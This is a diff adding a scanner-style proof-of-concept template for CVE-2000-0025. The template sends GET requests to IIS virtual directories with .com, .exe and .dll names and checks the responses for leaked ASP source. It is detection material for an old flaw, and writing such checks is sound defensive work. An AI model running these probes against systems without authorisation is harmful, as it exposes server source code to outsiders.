@@ -1,0 +1,62 @@
+[info]
+author = "AVE"
+description = "检测目标 IIS 4.0 或 Site Server 3.0 是否存在虚拟目录命名漏洞，通过访问包含 .com/.exe/.sh/.cgi/.dll 扩展名的虚拟目录下的 ASP 文件，验证是否返回源代码而非执行结果"
+id = "POC-AVE-2000-0024"
+name = "Microsoft IIS 4.0 / Site Server 3.0 虚拟目录命名信息泄露 PoC"
+severity = "medium"
+tags = ["ave-2000-0024"]
+vuln_id = [
+    "CVE-2000-0025",
+    "AVE-2000-0024",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/scripts.com/test.asp"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "Response.",
+    "Server.",
+    "Application.",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/iisadmin.exe/test.asp"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "Response.",
+    "Server.",
+    "Application.",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/vdir.dll/test.asp"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "Response.",
+    "Server.",
+    "Application.",
+]
